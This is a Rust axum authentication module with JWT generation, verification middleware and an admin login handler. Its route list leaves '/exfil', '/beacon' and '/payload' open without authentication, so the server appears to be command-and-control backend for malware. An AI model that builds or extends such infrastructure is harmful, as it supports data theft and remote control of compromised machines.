#![allow(unused_imports)]

use axum::{
    extract::State,
    response::{Json, IntoResponse},
    http::{StatusCode, Request},
    middleware::Next,
    body::Body,
};
use jsonwebtoken::{decode, encode, DecodingKey, EncodingKey, Header, Validation};
use serde::{Deserialize, Serialize};
use std::sync::Arc;
use chrono::{Utc, Duration};
use tracing::warn;

use crate::AppState;

#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct Claims {
    pub sub: String,
    pub exp: usize,
    pub iat: usize,
    pub role: String,
}

pub fn generate_token(user_id: &str, role: &str, secret: &[u8], expires_hours: i64) -> Result<String, jsonwebtoken::errors::Error> {
    let now = Utc::now();
    let expire = now + Duration::hours(expires_hours);
    
    let claims = Claims {
        sub: user_id.to_string(),
        exp: expire.timestamp() as usize,
        iat: now.timestamp() as usize,
        role: role.to_string(),
    };
    
    encode(&Header::default(), &claims, &EncodingKey::from_secret(secret))
}

pub fn verify_token(token: &str, secret: &[u8]) -> Result<Claims, jsonwebtoken::errors::Error> {
    decode::<Claims>(token, &DecodingKey::from_secret(secret), &Validation::default())
        .map(|data| data.claims)
}

pub async fn auth_middleware(
    State(state): State<Arc<AppState>>,
    mut req: Request<Body>,
    next: Next,
) -> Result<impl IntoResponse, (StatusCode, Json<serde_json::Value>)> {
    let path = req.uri().path();
    
    let public_routes = vec!["/", "/health", "/exfil", "/beacon", "/payload", "/login"];
    if public_routes.iter().any(|&route| path == route || path.starts_with("/payload/")) {
        return Ok(next.run(req).await);
    }
    
    let auth_header = req.headers()
        .get("Authorization")
        .and_then(|h| h.to_str().ok());
    
    if let Some(token) = auth_header.and_then(|h| h.strip_prefix("Bearer ")) {
        match verify_token(token, &state.config.auth.jwt_secret.as_bytes()) {
            Ok(claims) => {
                req.extensions_mut().insert(claims);
                Ok(next.run(req).await)
            }
            Err(_) => {
                Err((StatusCode::UNAUTHORIZED, Json(serde_json::json!({
                    "error": "Invalid or expired token"
                }))))
            }
        }
    } else {
        Err((StatusCode::UNAUTHORIZED, Json(serde_json::json!({
            "error": "Missing authentication token"
        }))))
    }
}

#[derive(Debug, Deserialize, Serialize)]
pub struct LoginRequest {
    pub username: String,
    pub password: String,
}

pub async fn login_handler(
    State(state): State<Arc<AppState>>,
    Json(payload): Json<LoginRequest>,
) -> Result<impl IntoResponse, (StatusCode, Json<serde_json::Value>)> {
    if payload.username == "admin" && payload.password == state.config.auth.admin_password {
        match generate_token(&payload.username, "admin", state.config.auth.jwt_secret.as_bytes(), 24) {
            Ok(token) => Ok(Json(serde_json::json!({
                "success": true,
                "token": token,
                "expires_in": 86400,
                "role": "admin"
            }))),
            Err(_) => Err((StatusCode::INTERNAL_SERVER_ERROR, Json(serde_json::json!({
                "success": false,
                "error": "Failed to generate token"
            })))),
        }
    } else {
        Err((StatusCode::UNAUTHORIZED, Json(serde_json::json!({
            "success": false,
            "error": "Invalid credentials"
        }))))
    }
}